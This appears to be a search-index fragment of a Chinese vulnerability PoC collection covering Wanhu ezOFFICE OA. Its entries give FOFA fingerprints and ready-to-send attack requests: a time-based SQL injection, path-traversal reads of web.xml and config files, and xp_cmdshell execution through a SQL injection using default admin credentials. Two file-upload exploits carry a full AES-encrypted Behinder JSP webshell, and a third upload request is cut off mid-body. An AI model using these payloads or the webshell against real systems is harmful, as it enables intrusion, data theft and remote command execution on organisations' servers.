","date":"0001-01-01","objectID":"/%E4%B8%80%E7%B1%B3oa-getfile.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%80%E7%B1%B3oa-getfile.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"万户OA DocumentEdit.jsp SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-documentedit.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-documentedit.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 万户OA DocumentEdit.jsp文件存在SQL注入漏洞，攻击者通过发送特殊的请求包可以对数据库进行SQL注入，获取服务器敏感信息 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-documentedit.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-documentedit.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 万户OA ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-documentedit.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-documentedit.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"万户网络-ezOFFICE\" ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-documentedit.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-documentedit.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 验证POC /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'-- ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-documentedit.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-documentedit.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"万户OA download_ftp.jsp 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-download_ftp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-download_ftp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 万户OA download_ftp.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-download_ftp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-download_ftp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 万户OA ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-download_ftp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-download_ftp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"万户网络-ezOFFICE\" ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-download_ftp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-download_ftp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 验证POC /defaultroot/download_ftp.jsp?path=/../WEB-INF/\u0026name=aaa\u0026FileName=web.xml ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-download_ftp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-download_ftp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"万户OA download_old.jsp 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-download_old.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-download_old.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 万户OA download_old.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-download_old.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-download_old.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 万户OA ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-download_old.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-download_old.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"万户网络-ezOFFICE\" ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-download_old.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-download_old.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 验证POC /defaultroot/download_old.jsp?path=..\u0026name=x\u0026FileName=index.jsp /defaultroot/download_old.jsp?path=..\u0026name=x\u0026FileName=WEB-INF/web.xml ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-download_old.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-download_old.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"万户OA downloadhttp.jsp 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-downloadhttp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-downloadhttp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 万户OA downloadhttp.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-downloadhttp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-downloadhttp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 万户OA ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-downloadhttp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-downloadhttp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"万户网络-ezOFFICE\" ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-downloadhttp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-downloadhttp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 验证POC /defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-downloadhttp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-downloadhttp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"万户OA DownloadServlet 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-downloadservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-downloadservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 万户OA DownloadServlet接口存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器中的敏感文件，获取敏感信息 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-downloadservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-downloadservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 万户OA ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-downloadservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-downloadservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"万户网络-ezOFFICE\" ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-downloadservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-downloadservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 验证POC /defaultroot/DownloadServlet?modeType=0\u0026key=x\u0026path=..\u0026FileName=WEB-INF/classes/fc.properties\u0026name=x\u0026encrypt=x\u0026cd=\u0026downloadAll=2 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-downloadservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-downloadservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"万户OA fileUpload.controller 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-fileupload.controller-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-fileupload.controller-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 万户OA fileUpload.controller 存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-fileupload.controller-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-fileupload.controller-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 万户OA ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-fileupload.controller-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-fileupload.controller-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"万户网络-ezOFFICE\" ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-fileupload.controller-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-fileupload.controller-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 发送请求包上传文件 POST /defaultroot/upload/fileUpload.controller HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0 Accept-Encoding: gzip, deflate Accept: */* Connection: Keep-Alive Content-Type: multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0 Content-Length: 773 --KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0 Content-Disposition: form-data; name=\"file\"; filename=\"cmd.jsp\" Content-Type: application/octet-stream Content-Transfer-Encoding: binary \u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e\u003c%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u003e\u003c%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*......tas9er*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%\u003e --KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0-- 使用冰蝎连接木马 /defaultroot/upload/html/xxxxxxxxxx.jsp ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-fileupload.controller-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-fileupload.controller-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"万户OA OfficeServer.jsp 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-officeserver.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-officeserver.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 万户OA 除了 /defaultroot/officeserverservlet 接口外的另一处接口 OfficeServer.jsp 同时也存在任意文件上传漏洞，导致攻击者可上传任意文件获取服务器权限 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-officeserver.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-officeserver.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 万户OA ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-officeserver.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-officeserver.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"万户网络-ezOFFICE\" ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-officeserver.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-officeserver.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 发送请求包 POST /defaultroot/public/iWebOfficeSign/OfficeServer.jsp HTTP/1.1 Host: Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: OASESSIONID=847AE3A2E5D155AE7FB1CD2C6736CD66 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close Content-Length: 798 DBSTEP V3.0 170 0 1000 DBSTEP=REJTVEVQ OPTION=U0FWRUZJTEU= RECORDID= isDoc=dHJ1ZQ== moduleType=Z292ZG9jdW1lbnQ= FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw 111111111111111111111111111111111111111111111111 \u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e\u003c%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u003e\u003c%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%\u003e 上传后的目录为 /defaultroot/public/edit/cmd_test.jsp ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-officeserver.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-officeserver.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"万户OA showResult.action 后台SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-showresult.action-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-showresult.action-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 万户OA showResult.action 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-showresult.action-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-showresult.action-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 万户OA ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-showresult.action-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-showresult.action-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"万户网络-ezOFFICE\" ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-showresult.action-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-showresult.action-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 默认账号密码：admin/111111 发送请求包： POST /defaultroot/Graph!showResult.action HTTP/1.1 Host: User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 69 Connection: close Cookie: OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; LocLan=zh_CN; JSESSIONID=5AC1D44965A277C90D94B57DEDA82992; OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; ezofficeDomainAccount=whir; empLivingPhoto=; ezofficeUserName=dsfssaq; ezofficeUserPortal=; ezofficePortal135=1 Upgrade-Insecure-Requests: 1 database=localDataSource\u0026dataSQL=exec+master..xp_cmdshell+\"ipconfig\"; ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-showresult.action-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-showresult.action-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"万户OA smartUpload.jsp 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-smartupload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-smartupload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 万户OA smartUpload.jsp文件存在文件上传接口，且没有对文件类型进行过滤,导致任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-smartupload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-smartupload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 万户OA ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-smartupload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-smartupload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"万户网络-ezOFFICE\" ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-smartupload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-smartupload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 文件上传接口 /defaultroot/extension/smartUpload.jsp?path=information\u0026fileName=infoPicName\u0026saveName=infoPicSaveName\u0026tableName=infoPicTable\u0026fileMaxSize=0\u0026 可直接上传恶意jsp文件 POST /defaultroot/extension/smartUpload.jsp?path=information\u0026mode=add\u0026fileName=infoPicName\u0026saveName=infoPicSaveName\u0026tableName=infoPicTable\u0026fileMaxSize=0\u0026fileMaxNum=0\u0026fileType=gif,jpg,bmp,jsp,png\u0026fileMinWidth=0\u0026fileMinHeight=0\u0026fileMaxWidth=0\u0026fileMaxHeight=0 HTTP/1.1 Host: Content-Length: 938 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: JSESSIONID=PjXnh6bLTzy0ygQf41vWctGPLGkSvkJ6J1yS3ppzJmCvVFQZgm1r!1156443419 Connection: close ------WebKitFormBoundarynNQ8hoU56tfSwBVU 